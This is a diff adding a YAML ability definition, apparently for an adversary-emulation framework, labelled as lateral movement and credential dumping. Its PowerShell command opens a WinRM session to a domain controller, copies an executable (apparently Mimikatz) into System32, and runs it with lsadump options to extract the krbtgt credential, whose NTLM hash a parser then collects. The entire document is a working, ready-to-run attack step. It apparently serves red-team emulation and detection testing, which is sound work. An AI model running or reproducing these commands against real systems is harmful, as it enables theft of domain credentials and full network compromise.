@@ -1,0 +1,26 @@
+---
+- id: acecc8f7-18c2-41fd-87bc-39ffd644e4e9
+  name: 16.C/D -  Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping 
+  description: Establish connection to Domain Controller
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\invoke-winrmsession.ps1;
+          $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
+          Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+          if ($?) {
+            write-host "[+] Successfully copied m.exe to remote host";
+          } else {
+            write-host "[!] Error, copying and executing m.exe on remote host";
+          }
+          Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
+          
+        payload: invoke-winrmsession.ps1,m.exe
+        parsers:
+          plugins.evals.app.parsers.ntlm:
+            - source: target.ntlm
